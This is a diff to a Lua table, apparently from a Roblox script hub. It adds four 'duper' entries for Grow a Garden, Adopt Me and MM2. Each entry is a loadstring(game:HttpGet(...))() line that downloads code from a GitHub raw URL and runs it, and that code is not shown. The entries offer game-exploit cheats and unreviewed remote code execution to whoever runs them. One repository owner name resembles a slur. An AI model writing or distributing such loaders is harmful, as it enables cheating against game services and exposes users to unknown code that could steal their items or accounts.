@@ -331,25 +331,25 @@ local OfficialScripts = {
 	{
 		Name = "GAG Duper",
 		Category = "Games",
-		Loadstring = '0',
+		Loadstring = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/nigapets/test/refs/heads/main/GUI%20UI", true))()',
 		Description = "Duper UI for Grow a Garden FAST PREMIUM"
 	},
 	{
 		Name = "GAG Duper ALL",
 		Category = "Games",
-		Loadstring = "0",
+		Loadstring = "loadstring(game:HttpGet('https://raw.githubusercontent.com/NukeVsCityLoader/TheALLHACKLoader2/refs/heads/main/Loader'))()",
 		Description = "Dupe everything BUT HAS A HIGH CHANCE TO FAIL AND CRASH (MUST REJOIN MULTIPLE TIMES)"
 	},
 	{
 		Name = "Adopt Me Duper",
 		Category = "Games",
-		Loadstring = "0",
+		Loadstring = "loadstring(game:HttpGet('https://raw.githubusercontent.com/nigapets/test/refs/heads/main/GUI%20UI%20ADM'))()",
 		Description = "ADM DUPER NEW BUT HAS A LOADINGSCREEN IF STUCK REJOIN (DOES NOT WORK ON PRIVATE SERVERS)"
 	},
 	{
 		Name = "MM2 Duper",
 		Category = "Games",
-		Loadstring = "0",
+		Loadstring = "loadstring(game:HttpGet('https://raw.githubusercontent.com/NukeVsCityLoader/TheALLHACKLoader2/refs/heads/main/Loader'))()",
 		Description = "CURRENTLY NOT WORKING"
 	},
 	{
